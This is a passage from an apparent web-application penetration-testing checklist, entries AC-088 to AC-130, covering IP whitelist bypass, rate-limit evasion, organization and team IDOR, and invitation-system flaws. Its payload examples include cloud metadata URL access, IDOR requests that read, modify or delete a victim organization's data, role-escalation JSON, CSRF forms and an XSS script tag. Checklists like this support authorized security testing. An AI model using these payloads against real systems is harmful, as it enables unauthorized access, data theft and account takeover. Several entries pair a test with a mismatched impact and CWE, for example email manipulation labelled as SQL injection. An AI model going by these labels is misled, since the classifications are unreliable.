**Payload Example:**

```
SSRF request from whitelisted server IP
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## AC-088 — CIDR Range Exploitation
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. Analyze CIDR whitelist 2. Find IPs in range 3. Access from range edge 4. Bypass intended restriction

**Expected Result:** CIDR ranges should be minimal

**Payload Example:**

```
Access from 10.0.0.255 when 10.0.0.0/24 whitelisted
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Network Tools

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-089 — Proxy Chain IP Masking
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. IP whitelist enforced 2. Chain through allowed proxy 3. Mask real IP 4. Bypass restriction

**Expected Result:** Proxy chains should be detected

**Payload Example:**

```
Route through whitelisted proxy
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Proxy Tools / Burp Suite

**References:** CWE-840; PortSwigger Business logic

---

## AC-090 — IP Whitelist Race Condition
**Test Category:** Race Condition · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. Admin removing attacker IP 2. Attacker rapidly accessing 3. Win race 4. Access during removal

**Expected Result:** IP changes should be atomic

**Payload Example:**

```
Access during whitelist update
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## AC-091 — Cloud Metadata IP Access
**Test Category:** Security Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** IP Whitelisting

**Test Steps:** 1. Application fetches URLs 2. Request cloud metadata IP 3. Bypass network restrictions 4. Access instance credentials

**Expected Result:** Metadata IPs should be blocked

**Payload Example:**

```
http://169.254.169.254/ or cloud equivalents
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-840; PortSwigger Business logic

---

## AC-092 — Rate Limit Bypass via IP Rotation
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Hit rate limit 2. Change source IP 3. Continue requests 4. Bypass rate limiting

**Expected Result:** Rate limiting should use multiple factors

**Payload Example:**

```
X-Forwarded-For rotation with different IPs
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-093 — Rate Limit Bypass via User-Agent
**Test Category:** Security Bypass · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Hit rate limit 2. Change User-Agent header 3. Continue requests 4. Bypass limitation

**Expected Result:** Rate limiting should not rely on User-Agent

**Payload Example:**

```
Change User-Agent for each request batch
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-094 — Rate Limit Bypass via API Key Rotation
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Hit limit on API key 2. Generate new API key 3. Continue with new key 4. Bypass per-key limits

**Expected Result:** Key generation should be limited

**Payload Example:**

```
Generate multiple API keys
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-095 — Rate Limit Header Manipulation
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Analyze rate limit headers 2. Modify client-sent headers 3. Reset rate limit counter 4. Unlimited requests

**Expected Result:** Rate limit should be server-controlled

**Payload Example:**

```
X-RateLimit-Remaining: 9999 header injection
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-096 — Endpoint-Specific Rate Limit Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Endpoint A rate limited 2. Same function on endpoint B 3. No limit on B 4. Bypass via alternate endpoint

**Expected Result:** All similar endpoints should share limits

**Payload Example:**

```
/api/v1/login vs /api/v2/login
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-097 — HTTP Method Rate Limit Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. POST rate limited 2. Try GET with body 3. Bypass POST limit 4. Continue operation

**Expected Result:** All methods should be limited

**Payload Example:**

```
GET /api/action with POST body
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-098 — Case Sensitivity Rate Limit Bypass
**Test Category:** Security Bypass · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. /api/login rate limited 2. Try /API/LOGIN 3. Different rate limit bucket 4. Bypass limit

**Expected Result:** Path matching should be case-insensitive

**Payload Example:**

```
/API/Login vs /api/login
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-099 — Unicode Path Rate Limit Bypass
**Test Category:** Security Bypass · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Path rate limited 2. Use Unicode equivalent 3. Different bucket 4. Bypass limit

**Expected Result:** Unicode should be normalized

**Payload Example:**

```
/api/usеrs (Cyrillic е) vs /api/users
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-100 — Distributed Rate Limit Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Hit rate limit 2. Requests from distributed IPs 3. Each IP under limit 4. Aggregate bypass

**Expected Result:** Global rate limiting should be implemented

**Payload Example:**

```
Botnet-style distributed requests
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Distributed Tools / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-101 — Rate Limit Reset Timing Attack
**Test Category:** Security Bypass · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Analyze reset timing 2. Time requests precisely 3. Maximize requests per window 4. Optimize rate limit usage

**Expected Result:** Reset timing should not be predictable

**Payload Example:**

```
Requests timed to reset boundary
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-102 — GraphQL Query Complexity Bypass
**Test Category:** Denial of Service · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Rate limit on requests 2. Single complex GraphQL query 3. Bypass request limit 4. Resource exhaustion

**Expected Result:** Query complexity should be limited

**Payload Example:**

```
Single query with nested depth/aliases
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** GraphQL Tools / Altair

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-103 — Batch Request Rate Limit Bypass
**Test Category:** Security Bypass · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Single requests limited 2. Batch multiple in one request 3. Bypass per-request limit 4. Execute many operations

**Expected Result:** Batch operations should count individually

**Payload Example:**

```
POST /api/batch with 1000 operations
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-104 — WebSocket Rate Limit Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. REST API rate limited 2. Same function via WebSocket 3. No WebSocket limit 4. Unlimited operations

**Expected Result:** WebSocket should have rate limits

**Payload Example:**

```
WS messages bypassing REST limits
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / WS King

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-105 — Cache-Based Rate Limit Bypass
**Test Category:** Security Bypass · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Uncached requests limited 2. Cache responses 3. Serve from cache 4. Bypass rate limit

**Expected Result:** Cached responses should count

**Payload Example:**

```
Force cache hits to bypass limits
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Cache Analysis

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-106 — Authentication Rate Limit DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Rate Limiting

**Test Steps:** 1. Rapidly attempt logins 2. Trigger account lockout 3. Lock out legitimate user 4. Denial of service

**Expected Result:** Lockout should prevent but not over-restrict

**Payload Example:**

```
Lock victim's account via failed attempts
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-107 — Organization IDOR Access
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Access own organization 2. Modify org_id parameter 3. Access another organization 4. View competitor data

**Expected Result:** Organization access should verify membership

**Payload Example:**

```
GET /api/orgs/victim_org_id/data
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-108 — Organization IDOR Modification
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Modify own organization 2. Change org_id 3. Modify another organization 4. Change competitor settings

**Expected Result:** Modification should verify ownership

**Payload Example:**

```
PUT /api/orgs/victim_org_id {"name":"hacked"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-109 — Team Member Addition IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Add member to own team 2. Modify team_id 3. Add self to another team 4. Gain unauthorized access

**Expected Result:** Member addition should verify authority

**Payload Example:**

```
POST /api/teams/victim_team/members {"user_id":"attacker"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-110 — Team Member Removal IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Remove member from own team 2. Modify target 3. Remove admin from their team 4. Disrupt organization

**Expected Result:** Member removal should verify authority

**Payload Example:**

```
DELETE /api/teams/victim_team/members/admin_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-111 — Organization Role Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Join organization as member 2. Modify own role 3. Escalate to owner 4. Full organization control

**Expected Result:** Role changes should require owner approval

**Payload Example:**

```
PUT /api/orgs/123/members/self {"role":"owner"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-112 — Organization Settings IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. View own org settings 2. Modify org_id 3. View another org's settings 4. Extract sensitive configuration

**Expected Result:** Settings access should verify membership

**Payload Example:**

```
GET /api/orgs/victim_org/settings
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-113 — Organization Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Delete own organization 2. Modify org_id 3. Delete victim organization 4. Destroy their data

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/orgs/victim_org_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-114 — Cross-Organization Data Access
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Access own org data 2. Modify filters/queries 3. Access cross-org data 4. Data breach

**Expected Result:** Organization boundaries should be enforced

**Payload Example:**

```
Query returning data from all organizations
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-115 — Organization Transfer Vulnerability
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Initiate org transfer 2. Manipulate recipient 3. Transfer to attacker account 4. Steal organization

**Expected Result:** Transfer should require both party consent

**Payload Example:**

```
POST /api/orgs/123/transfer {"to":"attacker_id"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## AC-116 — Team Hierarchy Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. User in child team 2. Access parent team resources 3. Bypass hierarchy 4. Elevate access

**Expected Result:** Team hierarchy should be enforced

**Payload Example:**

```
Access parent team data as child team member
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-117 — Organization Clone Data Leak
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Clone organization 2. Receive copy of another org 3. Access their data 4. Data exfiltration

**Expected Result:** Clone should only copy own org data

**Payload Example:**

```
POST /api/orgs/victim_org/clone
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-118 — Billing Access Cross-Organization
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Access own billing 2. Modify org_id 3. Access victim's billing 4. Extract payment info

**Expected Result:** Billing should verify organization membership

**Payload Example:**

```
GET /api/orgs/victim_org/billing
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-119 — CSRF on Organization Settings
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Team / Organization Management

**Test Steps:** 1. Create malicious page 2. Admin visits page 3. Settings modified 4. Security weakened

**Expected Result:** Settings should require CSRF token

**Payload Example:**

```
<form action="/org/settings" method="POST"><input name="public" value="true"></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## AC-120 — Invitation Token Enumeration
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Receive invitation token 2. Analyze token structure 3. Enumerate valid tokens 4. Accept others' invitations

**Expected Result:** Tokens should be unpredictable

**Payload Example:**

```
Sequential or timestamp-based tokens
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Sequencer / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## AC-121 — Invitation Token Reuse
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Accept invitation 2. Use same token again 3. Join multiple times 4. Create duplicate accounts

**Expected Result:** Tokens should be single-use

**Payload Example:**

```
Reuse accepted invitation token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-122 — Invitation IDOR - Revoke Others'
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Revoke own invitation 2. Modify invitation_id 3. Revoke others' invitations 4. Prevent legitimate joins

**Expected Result:** Revocation should verify authority

**Payload Example:**

```
DELETE /api/invitations/victim_invite_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-123 — Invitation Role Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Receive member invitation 2. Modify role parameter 3. Join as admin 4. Elevate privileges

**Expected Result:** Role should be fixed by sender

**Payload Example:**

```
Accept invitation with {"role":"admin"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-124 — Invitation Email Manipulation
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Send invitation 2. Modify recipient email 3. Send to unintended recipient 4. Social engineering

**Expected Result:** Email should be validated

**Payload Example:**

```
Invite to attacker@evil.com instead of victim@company.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AC-125 — Expired Invitation Usage
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Receive invitation 2. Wait for expiration 3. Use expired token 4. Join after expiry

**Expected Result:** Expired invitations should be rejected

**Payload Example:**

```
Use invitation after expiration time
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-126 — Invitation Brute Force
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Find invitation endpoint 2. Brute force tokens 3. Find valid invitation 4. Accept unauthorized

**Expected Result:** Invitation tokens should be long and random

**Payload Example:**

```
Brute force 6-character invite codes
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-127 — Mass Invitation Spam
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Access invitation feature 2. Send unlimited invitations 3. Spam email addresses 4. Reputation damage

**Expected Result:** Invitation rate should be limited

**Payload Example:**

```
Send 10000 invitations per minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## AC-128 — Invitation Link Injection
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Create invitation 2. Inject XSS in invite message 3. Recipient views invitation 4. XSS executes

**Expected Result:** Invitation content should be sanitized

**Payload Example:**

```
Invite message with <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## AC-129 — Invitation CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Create malicious page 2. Trigger invitation send 3. Invitations sent without consent 4. Resource abuse

**Expected Result:** Invitation sending should have CSRF protection

**Payload Example:**

```
<form action="/invite" method="POST"><input name="email" value="spam@evil.com"></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## AC-130 — Pending Invitation Information Leak
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Query pending invitations 2. Access without authorization 3. View pending emails 4. Enumerate future users

**Expected Result:** Pending list should verify authority

**Payload Example:**

```
GET /api/invitations/pending listing all invites
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

